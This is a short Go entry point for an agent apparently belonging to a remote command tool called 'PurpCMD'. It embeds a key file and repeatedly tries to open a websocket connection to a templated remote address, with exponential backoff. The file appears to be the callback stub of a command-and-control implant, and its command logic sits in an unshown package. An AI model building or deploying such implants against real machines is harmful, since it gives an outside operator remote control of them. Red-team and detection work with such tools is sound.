package main

import (
	"log"
	"embed"
	"time"

	"purpcmd/agent"
)


//go:embed key
var key embed.FS
func main() {
	ua  := "Mozilla PurpCMD"
	uri := "/"
	remoteAdd := "{{localhost}}"
	pk := ""
	ps := ""
	
	var t time.Duration = 1
	var c int = 0
	for {
		err := agent.Wsclient(ua, uri, remoteAdd, key, pk, ps)
		if err != nil {
			log.Printf("Try %d sleep for %d", c, t)
			time.Sleep(t * time.Millisecond)
			if t >= 32768 {
				continue
			} else {
				t *= 2 
			}
		} else {
			break
		}
		if c == 25 {
			break
		}
		c++
	}
}